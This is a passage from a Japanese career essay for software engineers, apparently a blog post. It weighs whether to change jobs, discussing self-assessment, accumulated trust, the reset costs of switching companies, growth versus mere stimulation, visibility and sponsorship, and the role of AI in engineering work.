Contributor）トラック——部下を持たずに技術で貢献し続けるキャリアパス——という選択肢の存在だ。スタッフエンジニア、プリンシパルエンジニアといった役職は、マネージャーにならずとも、より大きなインパクトを生み出す道だ。マネジメントだけが「上」ではない。シニアの先には4つの方向性がある。テックリード（チームの技術方針を導く）、アーキテクト（システム設計の意思決定を担う）、ソルバー（組織横断の難問を解決する）、ライトハンド（経営層の右腕として動く）。どれを目指すかで、求められるスキルセットも変わる。全部できる必要はない。どれを選ぶかは、あなた次第だ。重要なのは、スタッフエンジニアは「シニアのシニア」ではないということだ。役割そのものが変わる。コードを書く時間は減り、リーダーシップ、ファシリテーション、組織の接着剤としての仕事が増える。「もっとコードを書きたい」という人には向かない道だ。だから、「シニアになったら自動的にスタッフを目指す」という発想は危険だと私は思っている。多くのエンジニアは、最初は「一人前の開発者」からスタートする。そこから、どの方向に進むか。それを決めるのは、あなた自身だ。ここで自分に問いかけてほしい。あなたは次にどの方向に進みたいのか。それが言語化できていないなら、転職を考えるのはまだ早い。なぜなら、方向が定まっていない転職は、ただの「移動」に過ぎないからだ。移動しても、キャリアは積み上がらない。方向性を考えることと同じくらい大事なことがある。「自分は今、どこにいるのか」を知ることだ。自分の能力を棚卸しする目指す方向が見えてきたとしよう。でも、その方向に進むためには、今の自分の立ち位置を正確に把握する必要がある。転職を考えるとき、多くの人は外側に目を向ける。「あの会社は良さそうだ」「この技術を使ってみたい」「あの人みたいになりたい」。でも、本当に大事なのは、自分という器がどうなっているかを知ることだ。どんなに良い環境に移っても、器が変わらなければ、入ってくるものは同じだ。逆に、自分の器をちゃんと理解していれば、今の環境でも次の環境でも、適切な選択ができる。ここで、転職を考える前に確認してほしいことがある。自分の「実力」を正しく評価できているか、ということだ。私は長い間、この評価を間違えていた。ゾーンに入って神がかった速度でコードを書く自分、難解なバグを一瞬で特定する自分——そういう「最高の瞬間」を「自分の実力」だと信じていた。だから、転職先でも同じパフォーマンスが出せると思っていた。逆だった。何もやる気が起きず、頭も回らず、ただ惰性でキーボードを叩いている日。その泥のような日に絞り出したアウトプット。それこそが、紛れもない私の「実力」だ。絶好調のときの成果は、再現性のない「運」や「上振れ」に過ぎない。転職先で、その「上振れ」を再現できる保証はどこにもない。なぜこれが転職を考えるときに重要なのか。信頼は「下限」に支払われるからだ。新しい職場で、あなたは「最高の自分」ではなく「最悪の自分」で評価される。慣れない環境、知らないコードベース、初対面のチームメンバー。その状況で出せるアウトプットが、あなたの「実力」として記録される。「本当はもっとできるんです」は通用しない。だから、転職先を選ぶときに問うべきは、「最高の自分が活躍できる場所か」ではない。「最悪の自分でも、最低限のパフォーマンスを出せる場所か」だ。もう1つ、能力について知っておくべきことがある。能力は文脈の中にしかない。今の環境で「できる人」だとしても、それは文脈に依存している。私自身、痛い目を見た。あるプロジェクトで成果を出せたとき、私はそれを自分の実力だと思っていた。でも振り返ると、違った。上司が事前に関係者と調整してくれていた。マネージャーがスコープを適切に切ってくれていた。先輩が技術的な地雷を踏む前に教えてくれていた。私は、応援してくれて、調整してくれていたマネージャーや上司の能力まで、自分の能力だと勘違いしていた。その支えが消えた環境で、同じパフォーマンスを出せるか。出せるわけがない。正しい認識はこうだ。「この文脈において、これまでの経験と周囲のサポートが噛み合って、たまたま価値が出せている」。では、その「器」——能力——は、どう捉えればいいのか。大きく分けて3つの軸がある。技術力——コードを書く力だ。設計力、実装力、レビュー力。特定の領域を深掘りする「スペシャリスト」か、複数の領域をカバーする「ジェネラリスト」か。どちらを目指すにせよ、ここが基盤になる。推進力——プロジェクトを前に進める力だ。タスクを完遂できるか。障害にぶつかっても解決策を見つけられるか。チームのボトルネックを解消できるか。「なぜこの機能が必要か」というビジネス課題を理解し、技術的な意思決定をビジネスインパクトで説明できるか。影響力——自分の外側に価値を生み出す力だ。チームへの影響力は、採用、オンボーディング、ドキュメント整備、勉強会の開催など。社外への影響力は、技術ブログ、カンファレンス登壇、OSS貢献など。どの軸を伸ばすかは、目指す役割によって変わる。テックリードを目指すなら技術力と推進力。EMを目指すなら推進力と影響力。スペシャリストを目指すなら技術力を極める。重要なのは、全部を上げようとしないことだ。自分が目指す役割に必要な能力を見極めて、そこに集中する。ここで、私自身の失敗を話したい。かつての私は「良いコードを書いていれば、いつか評価される」と思っていた。技術力さえあれば、周りが認めてくれる。黙々と良い仕事をしていれば、誰かが見ている。——甘かった。現実はこうだ。見えない仕事は、存在しないのと同じ。どんなに素晴らしい設計をしても、それを言語化して共有しなければ、誰も知らない。どんなに難しいバグを直しても、「大変だった」と伝えなければ、簡単な修正だと思われる。「仕事をやり遂げる人」として認められるには、技術的な能力だけでなく「何が重要かを見極める力」と「自分の仕事を周囲に伝える力」が必要だ。この2つを、私は長い間、軽視していた。「アピールするのは恥ずかしい」「実力で示せばいい」——そう思っていた。でも、それは傲慢だった。相手の時間を奪わずに、自分の仕事の価値を簡潔に伝えること。それはコミュニケーションスキルであり、チームで働く上での基本的な作法なのだ。つまり、私は「技術力」に過剰投資し、「推進力」と「影響力」に過少投資していた。多くのエンジニアは、同じ罠にはまる。新しいフレームワークを学ぶ。新しい言語を触る。それは楽しいし、成長した気になる。だが、「推進力」——泥臭い調整や、やり切る力——の不足から目を背けていないか。技術力があっても、プロジェクトを完遂できなければ、市場価値は上がらない。今の会社を辞めようとしているあなた。この3つの軸で自分を評価してみてほしい。次に目指す役割に対して、どの軸が足りていないのか。それが明確になっていないなら、転職しても同じ困難にぶつかる。環境を変えても、足りない能力は足りないままだ。ただ、ここで1つ付け加えたいことがある。能力を棚卸しするとき、多くの人は「足りないもの」ばかりを見る。私もそうだった。「技術力が足りない」「推進力が弱い」「影響力がない」——チェックリストを見て、できないことを数え上げる。そして、転職先を探すときも「ここに行けば○○が身につく」「あの会社なら△△を学べる」と、ないものを補う発想で動いてしまう。ないものを探し続けていたら、悩みは一生消えない。考えてみてほしい。どんな環境に行っても、足りないものは必ずある。新しい技術が次々に出てくる。上には上がいる。「あれもできない、これもできない」と数え上げれば、キリがない。そうやって「ないもの」を埋めようとしている限り、永遠に充足感は得られない。私自身、この罠に長い間はまっていた。「もっとコードが書けるようになりたい」「もっとコミュニケーション力をつけたい」「もっとビジネス視点を持ちたい」——足りないものリストは常に更新され続けた。そして気づいた。そのリストは、一生埋まらない。発想を変えよう。「ないものを探す」のではなく、「あるものを伸ばす」。あなたには、すでに強みがある。周囲より得意なことがある。それが何かを見極めて、そこに集中する。弱みを平均まで引き上げる努力は、強みを突き抜けさせる努力より、はるかに効率が悪い。私の場合、「調べること」「言語化すること」「ソフトウェアを実装すること」が比較的得意だった。コミュニケーション力が高いわけではない。政治的な立ち回りも苦手だ。でも、RFCやドキュメントを読み込んで理解し、それを実際に動くコードに落とし込み、さらに文章としてまとめることなら、周囲より少しだけ速かった。その「少しだけ」を、徹底的に伸ばすことにした。結果として、「あいつに任せれば、調べて、作って、ドキュメントにしてくれる」という評価が生まれた。これは戦略的な選択だ。何をやるかではなく、何をやらないか。弱みを気にして、あれもこれもと手を広げるのではなく、強みに絞って、そこで突き抜ける。だから、能力を棚卸しするとき、「足りないもの」だけでなく「すでにあるもの」にも目を向けてほしい。転職を考えるとき、「ここに行けば足りないものが補える」ではなく、「ここに行けば今の強みがさらに活きる」という視点で選んでほしい。足りないものは、一生足りない。だから、足りないものを数えるのをやめろ。今あるものを、もっと伸ばせ。正直に告白しよう。私には、仕事を選ぶときの悪い癖がある。小さなバグを直す。ドキュメントの誤字を修正する。チェックリストを埋めていく。1日の終わりに「今日も色々やった」と思える。でも、週末に振り返ると、本当にインパクトのある仕事をしたのか、分からなくなる。——これが、私の悪い癖だ。簡単で達成感はあるが、インパクトの低い仕事に逃げてしまう。お菓子をつまむように、小さなタスクをつまんでしまう。これが「スナッキング」だ。チェックリストを埋める快感は、脳にとって報酬だ。でも、その報酬に溺れて、本当に重要な仕事——曖昧で、難しくて、すぐに結果が出ない仕事——から逃げていないか。もう1つ、自分を戒めている罠がある。目立つが価値の低い仕事だ。社内の勉強会を頻繁に開く。Slackで積極的に発言する。目立つ。注目を集める。でも、ビジネスへの貢献は薄い。この罠にはまると、「忙しかった」と「成果を出した」を混同するようになる。振り返ってほしい。直近1ヶ月で、最もインパクトのあった仕事は何だったか。それに費やした時間は、全体の何割だったか。もし1割以下なら、残りの9割は「スナッキング」だった可能性がある。ここまで、「どこを目指すか」と「何を伸ばすか」について話してきた。では、実際に転職するとなったとき、何を失い、何を得るのか。その前に、転職を考えるときの大前提を確認しておきたい。「自分は会社にとって必要な存在だ」と思っているかもしれない。でも、それは本当だろうか。「替えが効く」という前提を認める別に会社なんていつ辞めても良い。文字通りの意味で替えの効かない人間なんて資本主義においては存在しない。これは冷徹な事実だ。どんなに優秀なエンジニアでも、会社は回る。あなたが辞めても、誰かが引き継ぐ。プロジェクトは続く。組織は適応する。「私がいないと回らない」——そう思いたい気持ちは分かる。でも、それは幻想だ。私自身、これを認めるのに時間がかかった。ある会社を辞めるとき、「自分がいなくなったら、あのシステムは誰がメンテするんだろう」と心配していた。3ヶ月後、元同僚に聞いた。「全然大丈夫だよ。○○さんが引き継いで、むしろ前より整理されてる」。——少し寂しかったが、同時にホッとした。そして気づいた。私は「替えが効かない」と思いたかっただけだ。この事実を認めることは、絶望ではない。むしろ、解放だ。「替えが効かない」と思い込んでいると、会社に縛られる。「私がいないと困る」「今辞めたら迷惑をかける」——そういう責任感は美しいが、それが「辞められない」という足枷になることがある。ブラックな環境でも我慢してしまう。メンタルを壊しても「今は辞められない」と言い聞かせる。替えが効くと認めることで、初めて「辞める」という選択肢が本当の意味で手に入る。ただし、ここで短絡的な結論に飛ばないでほしい。「替えが効く」→「だから辞めてもいい」——これは論理の飛躍だ。「替えが効く」から導ける結論は、もう1つある。「だから、どこに行っても価値を出せる能力を磨け」だ。会社にとって、あなたは替えが効く。だが、あなたにとって、積み上げた実績は替えが効かない。ここが重要だ。会社はあなたを手放せる。次の人を雇えばいい。でも、あなたが2年間かけて積み上げた信頼、ドメイン知識、人間関係——これは、転職した瞬間にリセットされる。会社にとっては「替えが効く」リソースでも、あなたにとっては「替えが効かない」資産なのだ。だから、問いはこうなる。「会社にとって替えが効く」という事実を認めた上で、「自分にとって替えが効かない資産」をどれだけ積み上げたか。信頼の複利、実績の蓄積、ドメイン知識——これらは「会社のため」に積み上げるのではない。「自分のため」に積み上げる。たまたま、その資産が今の会社で活きているだけだ。転職すれば、その一部はリセットされる。リセットされてでも得たいものがあるなら、辞めればいい。リセットするには惜しい資産があるなら、もう少し留まって、その資産を使い切ってから辞めればいい。「替えが効く」という事実は、転職を正当化する理由にも、現職に留まる理由にもなる。どちらの結論を導くかは、あなた次第だ。大事なのは、この事実を、感情的な決断の言い訳に使わないことだ。「どうせ替えが効くんだから、辞めてもいいでしょ」——それは、考えることを放棄している。「替えが効くからこそ、自分の資産を最大化する選択をする」——それが、戦略的な判断だ。この前提を踏まえた上で、いよいよ転職のコストについて考えよう。「替えが効く」からこそ、転職は自由にできる。だが、自由にできるからといって、コストがゼロなわけではない。転職は「投資」であり「リセット」である若さという資源は有限だ。私たちはキャリアを積む中で何かを投資し、その結果として何かを得ている。この構造を理解しないまま転職を繰り返すのは危険だ。20代の私は、この構造を理解していなかった。「若いうちは色々経験した方がいい」「転職で視野が広がる」——そういう言葉を真に受けて、2〜3年ごとに環境を変えていた。確かに視野は広がった。でも、振り返ると、広く浅くなっただけだった。新卒で未経験のうちは何もない。あるのはポテンシャルであり、若さであり、可能性だ。その資源を使い、何かしらの資産を得る必要がある。何を得るのか。それはスキルであり、それを活用した先の実績だ。実績は資産だ。そして資産には複利が効く。ある領域で実績を出すと、次はもう少し大きな仕事が回ってくる。それをこなすと、さらに大きな仕事が来る。「あの人はこの領域で結果を出した」という評判が、次の機会を連れてくる。これが複利だ。私が見てきた「キャリアがうまくいっている人」は、例外なくこの複利を回していた。1つの実績が次の実績を呼び、雪だるま式に大きくなっていく。逆に言えば、転職するたびにこの複利がリセットされる。転職するたびに、一定のロスが発生する。ビジネスドメインの理解、社内の人間関係、意思決定のプロセス、暗黙知として共有されている文化。これは、転職した瞬間にリセットされる。信頼貯金も同様だ。前職で積み上げた「あいつなら任せられる」という信頼は、新しい会社では通用しない。ゼロから積み上げ直す必要がある。この「リセットコスト」を、転職を考えるときに計算しているだろうか。私は、転職のリセットコストを「半年〜1年」と見積もっている。新しい環境でコンテキストをつかみ、信頼を積み上げ、本来のパフォーマンスを発揮できるようになるまでの時間だ。転職した直後の、あの居心地の悪さを覚えているだろうか。私が転職して最初の1週間、Slackの雑談チャンネルを眺めていた。前職では、私も会話の輪に入っていた。誰かが投稿すれば、すぐにリアクションをつけた。冗談を言えば、笑ってくれる人がいた。でも新しい会社では、誰も私のことを知らない。雑談チャンネルに何か書こうとして、やめた。「この人、誰？」と思われるのが怖かった。些細なことだ。でも、あの孤独感は今でも覚えている。前職では「あいつに聞けば分かる」と頼られていたのに、新しい会社では誰も自分を知らない。会議で発言しても、反応が薄い。提案しても、「この人は何者だ？」という目で見られる。チャットで質問しても、返事が遅い。——あの感覚は、信頼貯金がゼロになった瞬間だ。これが「信頼の貯金」だ。具体的に言おう。「あの件、○○さんに頼んでおけば大丈夫」——そう思われるまでに、どれだけの時間がかかっただろうか。最初は小さな仕事を任される。それを期限通りに、期待以上の品質で納める。次は少し大きな仕事を任される。また納める。この繰り返しで、「この人なら任せられる」という信頼が積み上がっていく。信頼があると、仕事が回りやすくなる。他のチームに協力を頼むとき、「あの人の頼みなら」と動いてもらえる。提案するとき、「あの人が言うなら、一度聞いてみよう」と耳を傾けてもらえる。逆に信頼がないと、どんなに正しいことを言っても、「あの人、誰？」で終わる。周囲があなたと一緒に働きたいと思う度合いが、あなたの成功を直接左右する。そして、この信頼の貯金は、転職した瞬間にゼロにリセットされる。前職で「あの人は信頼できる」と思われていても、新しい会社では関係ない。ゼロから積み上げ直すしかない。今の会社で、信頼貯金はどれくらい貯まっているか。その信頼貯金を使ってできる挑戦は、まだ残っていないか。せっかく貯めた信頼貯金を、使わずに捨てるのは、もったいなくないか。ここで、信頼貯金のROI（投資対効果）を考えてみてほしい。今の会社で積み上げた信頼があるからこそ挑戦できる「高難易度・高リターン」の仕事はないか。新規プロジェクトの立ち上げ。技術的負債の解消。チームの構造改革。こういう挑戦は、信頼がなければ任されない。信頼があるからこそ、「あいつに任せてみよう」となる。転職先で得られる期待値は、このリセットコストを支払ってでも余りあるほど高いか。その根拠は何か。「なんとなく成長できそう」ではなく、具体的に何を得られるのか。それを言語化できなければ、転職は「期待値の高い投資」ではなく、「よく分からないギャンブル」になる。ここまで、転職のコストについて話してきた。では、そのコストを支払う価値があるかどうかを判断するために、何を見ればいいのか。それは、今の場所で何を積み上げたか、だ。現職で何を成し遂げたか転職を考えるとき、多くの人は「次に何をしたいか」を考える。でも、その前に考えるべきことがある。現職で何を成し遂げたかだ。きつい言い方をする——これは私自身への言葉でもあるのだが——。転職する時に現職で主体的に動いて成し遂げた実績が語れなければ、現職の経験はエンジニアキッザニアに近い。シニアエンジニアやCTOが用意してくれた環境で、お膳立てされた仕事をこなしていただけ。新しいスキルが身についたとする。それは素晴らしい。でも、それだけでは足りない。そのスキルを使って、どのようなビジネス価値を出したのか。その過程でどう主体的に関わったのか。これが語れなければ、あなたは「お客さん」のままだ。もちろん、「キッザニア」も大事だ。お膳立てされた環境で体感したことは血肉になる。でも、それでいいのはある段階までだ。年収700万円、800万円、その先を目指すなら、「遊ばせてもらう側」から「遊び場を作る側」に回る必要がある。技術力だけでは昇進できない——これは誰でも言える。問題は、なぜ、分かっていても実践できないのかだ。「コードで問題を解決する」。それが私たちのアイデンティティだ。だから、可視化やスポンサー獲得を「政治的で汚い」と感じてしまう。「実力で認められたい」。その気持ちは痛いほど分かる。私もそうだった。でも現実は違う。技術的に正しい提案をしても、周囲を巻き込めなければ、提案は提案のまま終わる。「技術で解決できる」ことと「解決を任される」ことは、別の能力だ。私自身、昇進を見送られた経験がある。なぜ評価されないのか分からなかった。振り返って気づいた。上司が私のキャリア目標を察してくれることを、勝手に期待していた。「昇進したいです」と言ったことがあっただろうか。なかった。上司はエスパーではない。言わなければ、伝わらない。そしてもう1つ。技術的な正しさを組織に浸透させるのも、「技術」だ。相手の立場を理解し、伝わる言葉で説明し、合意を形成する。これを「政治」と呼ぶなら、政治もまた技術なのだ。そして、成果を出すだけで終わりではない。私は日報をつける習慣を大事にしている。Claude Codeを使って、日々の作業を記録している。何をやったか、何を学んだか、何に詰まったか。こうして記録しておけば、パフォーマンスレビューの自己評価で圧倒的に有利になる。半年前、1年前に何を達成したか、正確に思い出せるだろうか。記録がなければ、自分の成果を過小評価してしまう。成果を出すことと、成果を可視化することは、別のスキルだ。昇進には「スポンサー」と「可視化」が必要だ。スポンサーとは何か。あなたの成果を経営層に伝えてくれる人だ。上司や先輩の中に、「あいつは良い仕事をしている」と会議で言ってくれる人はいるか。人事評価の場で、あなたの名前を出してくれる人はいるか。いくら良い仕事をしても、上層部に伝わらなければ、昇進の話にはならない。スポンサーは単なる応援者ではなく、あなたのキャリアに実際に投資してくれる存在だ。可視化とは何か。自分の仕事の価値を、他人が理解できる形で残すことだ。「何を達成したか」「なぜそれが重要だったか」「組織にどう貢献したか」——これをドキュメントやSlackで発信しているか。戦略的に重要なプロジェクトに参加して、名前を売っているか。これが揃って初めて、「この人を昇進させよう」という話になる。ネットワークも重要だ。社内の同僚、社外のプロフェッショナル、経営層——この3方向の人脈を意識的に育てることで、キャリアの選択肢が広がる。転職を考えるなら、この3つのネットワークがどれだけ育っているか、自問してみてほしい。今、辞めようとしているあなたに問いたい。現職で、あなたは何を成し遂げたか。主体的に動いた結果として、何が変わったか。もし自分がその場にいなかったとしたら、結果はどう変わっていたか。「自分がいたからこそ生まれた差分」を言語化できるか。それが語れないなら、まだ辞めるタイミングではないかもしれない。少なくとも、もう一度自分に問いかける価値はある。ここで、よく聞く反論がある。「現職で成し遂げたいけど、もう成長の機会がないんです」——本当だろうか。この「成長できない」という感覚を、もう少し掘り下げてみたい。「成長できない」は本当か「もうこの場所では成長できない」これは、転職理由としてよく聞く言葉だ。刺激がなくなった。慣れてしまった。自分よりできる人がいない。だから、成長するために環境を変えたい。でも、本当にそうだろうか。それは本当に環境のせいなのか。厳しいことを言う。「成長できない環境」なんて、ほとんど存在しない。あるのは、今の自分の能力では打破できない環境だ。それは環境の問題ではなく、能力の問題だ。能力があれば、たいていの環境は打破できる。「この環境では無理だ」と言っているのは、「今の自分には無理だ」と言っているのと同じだ。だからこそ、転職には意味がある。——逆説的に聞こえるかもしれないが、聞いてほしい。能力を上げてから転職すれば、次の環境も打破できる。能力を上げずに転職しても、また同じ壁にぶつかる。「この環境では成長できない」と言って転職した人が、次の会社でも同じことを言っているのを、何度も見てきた。環境を変えても、能力が変わらなければ、結果は同じだ。逆に、今の環境で壁を打破する力をつけた人は、どこに行っても通用する。転職は「逃げ場」ではなく「能力を活かす場」として選ぶべきだ。今の環境で能力を証明してから、その能力をより活かせる場所に移る。それが、転職を「飛躍」にする唯一の方法だ。では、ここで言う「能力を上げる」とは、具体的に何を指すのか。そもそも「成長」とは何なのか。成長とは何か。新しい技術を触ることか。新しいフレームワークを学ぶことか。それらは成長の一部ではあるが、本質ではない。成長とは、「解ける問題の範囲が広がること」であり、「より大きな責任を担えるようになること」だ。シニアエンジニアへの成長で最も重要なのは、「どの問題を解くべきかを見極める力」だ。コードで問題を解くことと、そもそも「どの問題を解くべきか」を判断することは、まったく別のスキルだ。私自身、この違いを理解するのに時間がかかった。ある時期、私は「新しい技術を触れていないと成長が止まる」と焦っていた。業務ではレガシーなコードをメンテしている。新しいことを学べていない。だから成長していない。そう思い込んでいた。でも振り返ると、あのレガシーコードのメンテナンス期間こそ、私が最も成長した時期だった。複雑に絡み合った依存関係を解きほぐす力。ドキュメントがない状況で調査する力。リスクを見積もって段階的にリファクタリングする判断力。これらは、最新技術を追いかけていたら身につかなかった。その定義で考えたとき、今の環境で成長の余地は本当にないのか。もしかしたら、自分が「成長」と呼んでいるものが、単なる「刺激」ではないだろうか。新しい技術を触る刺激。新しいチームに入る刺激。新しいプロダクトに関わる刺激。刺激と成長は違う。刺激は消費されるが、成長は蓄積される。私が「成長できない」と感じていたとき、本当は「刺激がない」だけだった。成長の機会は目の前にあった。ただ、それが「地味でつまらない仕事」に見えていたから、気づかなかった。ここで、よく言われる教えについて考えてみたい。「一番の下手くそでいよう（Be the Worst）」——プログラマーの世界でよく引用される教えだ。自分より優れた人たちの中に身を置くことで、自分も成長できる。だから、自分が一番下手くそになれる環境を探せ、と。この教えは正しい。でも、これを全員が実践したら、組織は成り立たない。全員が「学ぶ側」を求めて、誰も「教える側」に回らなかったら、どうなるか。優秀な人が集まる環境は、誰かが「教える側」を引き受けてくれているから成立している。「一番の下手くそでいよう」という教えは、その前提を無視している。——というのは、批判としては正しい。ただ、この教えの本質は、「常に学び続けろ」ということだ。「教える側」に回っても、学びは止まらない。むしろ、教えることで自分の理解の穴が見つかる。成長の形が変わるだけで、成長自体は続く。「もうこの場所では成長できない」と感じたとき、立ち止まって考えてほしい。自分は「学ぶ側」でいることしか考えていないのではないか。新しい技術を教わりたい。優秀な先輩からコードレビューを受けたい。それは大事だ。だが、いつまでも「教わる側」にいるわけにはいかない。「教える側」に回ったとき、別の成長が始まる。後輩のコードをレビューすることで、自分の理解の穴が見つかる。ドキュメントを整備することで、暗黙知が言語化される。勉強会を開くことで、チーム全体の底上げができる。そして何より、「自分がいないと回らない」から「自分がいなくても回る」状態を作ることが、次のステージへの準備になる。「接着剤の仕事」というものがある。チーム間の調整、ドキュメント整備、後輩の面倒を見る——コードを書かないが、チームを機能させるために不可欠な仕事だ。日本企業では、この仕事は評価されにくい。「○○さんはコード書いてないよね」と言われがちだ。でも、シニアレベルでこれをやると「リーダーシップを発揮している」と見なされることもある。上司とすり合わせて、この仕事がキャリアにどう評価されるか確認しておいた方がいい。評価されないなら、やりすぎは損だ。効果的なメンタリングとは何か。良いメンターはすぐに答えを与えない。複数の選択肢を提示し、メンティー自身に考えさせる。そして、自立を促す。メンタリングを受ける側も、答えを教えてもらうことを期待するのではなく、自分で考える姿勢が求められる。もし今の環境で良いメンターがいるなら、それは転職で失う大きな資産の1つだ。今の環境で、より大きな責任を担う機会はないか。より難しい問題に挑戦する機会はないか。それを探さずに「成長できない」と言っているなら、次の環境でも同じことが起きるだろう。ここまで、「成長できない」という感覚について掘り下げてきた。成長の機会は、案外、目の前にあるかもしれない。ただ、それでも「辞めたい」という気持ちが消えない人もいるだろう。次の問いは、より厳しいものになる。転職は「逃げ」になっていないか転職を繰り返す人の中に、あるパターンがある。新しい会社に入る。最初の半年は必死でキャッチアップする。コードベースを読み、ドメイン知識を吸収し、チームの信頼を獲得する。1年が経つ頃には「だいたい分かった」という感覚が出てくる。そして、ふと気づく。「あれ、最近あまり成長していない気がする」。ここで選択肢が2つある。今の環境で次のステージに挑戦するか、また新しい環境に移るか。後者を選び続けると、こうなる。キャッチアップが終わるたびに「成長が止まった」と感じ、また次の会社に行く。新しい環境でのキャッチアップを「成長」だと錯覚する。でも、それは成長ではない。ただの適応だ。本当の成長は、適応が終わった後にある。その環境で自分なりの仮説を持ち、試行錯誤し、失敗し、そこから学ぶ。大きなプロジェクトをやり遂げる。チームを任される。技術的な意思決定を下す。そういう経験を積んで初めて、次のステージに進める。転職を繰り返すたび、この「本当の成長」への到達前にリセットがかかる。結果、いつまでも「一人前の開発者」のまま、年齢だけが進んでいく。私自身、このリセットの苦しさを身をもって経験した。自社開発からSRE支援の会社に転職したとき、リセットが1回では済まないことを思い知った。支援先が変わるたびに、文脈がリセットされる。コードベース、チームメンバー、組織文化——全部ゼロから。しかも「支援」として来ている以上、キャッチアップ期間なんてない。初日から「で、何ができますか？」と問われる。最初は本当に苦しんだ。広い視野は得られたが、深さが積み上がらない。ある現場で得た知見を次の現場で活かそうとしても、文脈が違いすぎて通用しない。そして何より、信頼の蓄積がリセットされ続ける。ある支援先で信頼を獲得しても、次の案件ではまたゼロからだ。この経験から学んだことがある。転職のリセットコストは、転職先の業態によって大きく変わる。自社開発から自社開発への転職なら、リセットは1回で済む。でも、支援会社やコンサル、技術顧問に転職すると、リセットが繰り返し発生する。その覚悟があるかどうか、転職前に考えておくべきだ。この経験を通じて、私が学んだ原則がある。「自分の決定の結果を見届けられるだけの期間、同じ場所に留まれ」。成長のフィードバックループを回すためだ。設計した仕組みが半年後にどう使われているか。提案した施策が1年後にどんな結果を生んだか。それを見届けずに次の環境に移ったら、学びは半分で終わる。もう1つ、「許可を求めるな、宣言しろ」という原則がある。「○○してもいいですか？」ではなく、「○○します。問題があれば教えてください」と発信する。異論があれば誰かが止めてくれる。このスタイルで動けるようになると、権限がなくても物事を前に進められる。日本企業では「根回し」が重要だと言われる。それは間違いではない。でも、根回しにも2種類ある。「許可を得るための根回し」と「宣言を通すための根回し」だ。後者の方が、物事が前に進む。逆に、常に許可を求めないと動けない状態なら、まだその環境で信頼貯金が足りていない。その信頼を積み上げる前に辞めるのは、もったいない。ここで、このセクションの問いに戻ろう。「転職は『逃げ』になっていないか」。「今の環境では成長できない」と感じたとき、一度立ち止まって考えてほしい。それは本当に環境の限界なのか。それとも、環境には問題がないのに、難しいことから逃げているだけではないか。——私自身も、この問いに何度も向き合ってきた。そして正直に言えば、「逃げ」だったこともある。「退屈だが重要な課題」を解決することから目を背けて、「新しくて刺激的な環境」に逃げたくなる気持ちは、痛いほど分かる。ここまで、「今の環境で成長できるか」について話してきた。では、環境を変えるにせよ、留まるにせよ、これからのエンジニアは何を磨くべきなのか。AIと共存する時代に何を磨くかこの問いを考えるとき、避けて通れないのがAIの存在だ。AIは、定型的な作業を得意とする。コードの自動生成、バグの検出、ドキュメントの作成。これらの領域では、すでにAIが人間を補助し、場合によっては代替し始めている。つまり、「言われたことをそのまま実装する」だけのエンジニアは、価値が下がっていく。一方で、AIに代替されにくい領域もある。技術的な意思決定を下すこと。チームを率いること。ビジネス課題を理解し、技術で解決策を提案すること。曖昧な要件を整理し、実装可能な形に落とし込むこと。これは、当面の間、人間の仕事だ。私が優れた組織で見てきた共通点がある。エンジニアがビジネスに直接触れていることだ。「ITとビジネスの橋渡し役」を介さず、エンジニア自身がビジネス指標を理解し、顧客と対話する。その直接的な接点が、AIには代替できない価値を生む。逆に言えば、「要件を受け取って実装するだけ」のエンジニアは、AIに代替されやすい。これは他人事ではなく、私自身も常に意識していることだ。だが、ここで短絡的な結論に飛ばないでほしい。「じゃあ、転職してシニアなポジションを取りに行こう」というのは間違いだ。なぜなら、シニアになるためには、ジュニアとしての経験が必要だからだ。問題は、「ジュニアのまま留まり続けること」だ。今の環境で、次のステージに進むための挑戦ができるなら、そうすべきだ。転職は、その挑戦ができない場合の、最後の手段であるべきだ。ここで自分に問いかけてほしい。直近1ヶ月で、「人間が介入しなければ解決しなかった意思決定」を何回行ったか。AIがコードを書ける今、「実装する」だけでは価値が出にくい。曖昧な要件を整理する。ステークホルダー間の調整をする。技術的な選択肢の中から、ビジネスインパクトを考慮して決断する。そういう「人間にしかできない仕事」をどれだけやっているか。それがシニアへの階段を登る経験だ。ここまで、「どの方向に進むか」「何を磨くか」「今の環境で成長できるか」について話してきた。キャリアを考えるとき、避けて通れない話がもう1つある。転職を考える動機として、最も頻繁に挙がるテーマだ。「年収を上げたい」は目的ではなく結果である転職理由として「年収を上げたい」はよく聞く。分かる。私だって年収は高い方がいい。だが、年収は目的ではなく、結果だ。「年収は結果」と言うのは簡単だ。でも、転職サイトを開くと、年収で検索してしまう。なぜか。年収は分かりやすい指標だからだ。「能力が上がった」は測りにくい。「年収が上がった」は明確だ。この分かりやすさの罠が、私たちを「能力より年収」に引き寄せる。対策は1つ。年収以外の「分かりやすい指標」を自分で設定することだ。「○○の技術を導入した」「△△人のチームをリードした」「□□の問題を解決した」——そういう指標を先に決めておけば、年収の誘惑に負けにくい。転職サイトを開く前に、「この転職で得たいもの」を3つ書き出してみてほしい。そのうち「年収」が1番目に来るなら、一度立ち止まる必要がある。年収は、あなたが提供できる価値の対価だ。技術力が高ければ、難しい問題を解ける。推進力があれば、プロジェクトを成功に導ける。影響力があれば、チームや組織を良い方向に動かせる。これらの価値を提供できるから、高い年収が払われる。年収600万円から800万円、800万円から1000万円。それぞれのステージを超えるには、提供できる価値のレベルを上げる必要がある。「一人で開発できる」から「チームをリードできる」へ。「技術的な問題を解ける」から「ビジネス課題を技術で解決できる」へ。企業によって「シニアエンジニア」の意味は違う。大手IT企業とスタートアップでは、同じ肩書きでも求められる水準が全く異なる。1000人規模の会社のシニアと、10人のスタートアップのシニアでは、経験してきた課題の複雑さも、責任の範囲も違う。同じ「シニア」でも、会社によって期待値が違う。ここで正直に振り返りたい。キャリアの進め方について、私は無自覚だった。一生懸命働けば、報酬は自然についてくるものだと思っていた。「会社が見ていてくれる」「評価されるべき人は評価される」——そう信じていた。でも、それは間違いだった。努力だけでは、次のレベルに到達できない。技術を磨くことと、キャリアを戦略的に構築することは、別のスキルなのだ。日本企業では「出る杭は打たれる」と言われるが、「出なさすぎる杭」は存在すら認識されない。逆に言えば、能力を上げずに年収だけ上げようとしても、無理がある。高年収の会社に転職できたとしても、その期待値に応えられなければ、いずれ居場所を失う。私自身、この罠に片足を突っ込んだことがある。ある時期、市場が過熱していた。エンジニアの採用難で、年収相場が跳ね上がっていた。転職サイトを見ると、今の年収より明らかに高いオファーがゴロゴロしている。「自分の市場価値はこんなに高いのか」と浮かれていた。でも、冷静に考えれば分かる話だった。それは「私の価値」ではなく、「市場のバブル」だった。実際に転職した人の話を聞くと、入社後に苦しんでいるケースが少なくなかった。「この年収なら、これくらいできるだろう」という期待に応えられない。前職では周囲のサポートがあったから成